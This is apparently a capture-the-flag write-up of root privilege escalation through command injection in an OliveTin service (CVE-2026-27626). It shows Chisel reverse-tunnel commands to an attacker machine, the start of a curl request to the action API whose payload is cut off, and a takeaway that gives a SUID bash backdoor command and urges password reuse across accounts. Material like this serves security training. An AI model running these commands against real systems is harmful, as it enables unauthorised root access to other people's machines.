👑 Privilege Escalation — OliveTin CVE-2026-27626

CVE-2026-27626 OliveTin OS Command Injection

OliveTin was running as root on 127.0.0.1:1337. We used Chisel to forward the port:

# Attacker machine
chisel server -p 8888 --reverse

# Target machine (from haris shell)
./chisel client 10.10.15.26:8888 R:1337:127.0.0.1:1337

The vulnerable action Backup Database had a db_pass argument of type password, which bypasses safety checks. Injected a payload to create a SUID bash:

curl -X POST http://127.0.0.1:1337/api/olivetin.api.v1.OliveTinApiService/StartAction \
  -H "Content-Type: application/json" \

📊 Key Takeaways

  • NFS onboarding shares leak credentials. Always enumerate ports 111/2049 and mount exports.
  • Credential reuse is rampant. Try the same password on every account/service.
  • Internal services often run as root. Enumerate internal ports with ss -tulpn.
  • Argument type ≠ validation. OliveTin's password type skipped safety checks.
  • SUID bash is a reliable out. cp /bin/bash /tmp/rootbash && chmod 4755 /tmp/rootbash.
